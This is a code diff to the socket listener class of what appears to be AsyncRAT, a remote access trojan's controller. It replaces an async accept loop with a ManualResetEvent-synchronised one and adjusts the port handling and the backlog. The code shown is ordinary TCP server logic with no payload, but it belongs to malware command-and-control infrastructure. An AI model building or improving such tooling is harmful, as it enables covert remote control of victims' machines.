@@ -10,24 +10,26 @@ namespace AsyncRAT_Sharp.Sockets
     class Listener
     {
         public Socket listener { get; set; }
+        public static ManualResetEvent allDone = new ManualResetEvent(false);
 
-        public async void Connect(int port)
+        public void Connect(object port)
         {
             try
             {
                 listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                IPEndPoint IpEndPoint = new IPEndPoint(IPAddress.Any, port);
+                IPEndPoint IpEndPoint = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
                 listener.SendBufferSize = 50 * 1024;
                 listener.ReceiveBufferSize = 50 * 1024;
                 listener.ReceiveTimeout = -1;
                 listener.SendTimeout = -1;
                 listener.Bind(IpEndPoint);
-                listener.Listen(50);
+                listener.Listen(20);
 
                 while (true)
                 {
-                    await Task.Delay(1);
+                    allDone.Reset();
                     listener.BeginAccept(EndAccept, null);
+                    allDone.WaitOne();
                 }
             }
             catch (Exception ex)
@@ -44,8 +46,9 @@ namespace AsyncRAT_Sharp.Sockets
                 Clients CL = new Clients();
                 CL.InitializeClient(listener.EndAccept(ar));
             }
-            catch
-            { }
+            catch { }
+
+            finally { allDone.Set(); }
         }
     }
 }
